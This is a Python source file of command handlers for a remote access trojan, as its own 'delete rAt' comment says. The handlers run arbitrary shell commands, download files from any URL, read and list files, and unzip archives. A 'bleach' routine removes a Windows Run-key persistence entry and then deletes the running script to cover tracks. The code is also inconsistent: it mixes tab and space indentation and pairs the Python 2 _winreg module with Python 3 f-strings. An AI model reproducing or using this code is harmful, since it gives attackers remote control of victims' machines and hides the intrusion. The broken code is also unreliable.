import datetime
import os
import subprocess
import sys
import urllib.request
import zipfile

def cat(file_path):
	"""[~] read contents of file [~]"""
	if os.path.isfile(file_path):
		try:
			with open(file_path, 'r', encoding='utf-8') as f:
				return f.read(4000)
		except IOError:
			return '[!] permission denied [!]'
	else:
		return '[!] file not found [!]'

def execute(command):
	"""[*] execute a system command [*]"""
	try:
		output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
		return output.stdout + output.stderr
	except subprocess.CalledProcessError as e:
		return f'[!] error: {e} [!]'

def ls(path='.'):
	"""[~] list files/directories in path [~]"""
	if os.path.exists(path):
		try:
			return '\n'.join(os.listdir(path))
		except OSError:
			return '[!] permission denied [!]'
	else:
		return '[!] path not found [!]'

def pwd():
	"""[~] show current working directory [~]"""
	return os.getcwd()

def bleach(plat):
	"""[#] bleach mechanism for different platforms [#]"""
	if plat == 'win':
		import _winreg
        from _winreg import HKEY_CURRENT_USER as HKCU

        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'

        try:
            reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(reg_key, 'br')
            _winreg.CloseKey(reg_key)
        except WindowsError:
            pass

    elif plat == 'nix' or plat == 'mac':
    	###
    	pass

    # delete rAt
    os.remove(sys.argv[0])
    sys.exit(0)

def unzip(f):
	"""[;;] unzip file [;;]"""
	if os.path.isfile(f):
		try:
			with zipfile.ZipFile(f, 'r') as zf:
				zf.extractall()
				return f'[+] file {f} extracted [+]'
		except zipfile.BadZipfile:
			return '[!] failed to unzip file [!]'
	else:
		return '[!] file not found [!]'

def wget(url):
	"""[><] download file from URL [><]"""
	if not url.startswith('http://') and not url.startswith('https://'):
		return '[!] URL must begin with http:// or https:// [!]'

	fname = url.split('/')[-1] or f'file-{datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")}'

	try:
		urllib.request.urlretrieve(url, fname)
		return f'[+] file {fname} downloaded [+]'
	except IOError:
		return '[!] download failed [!]'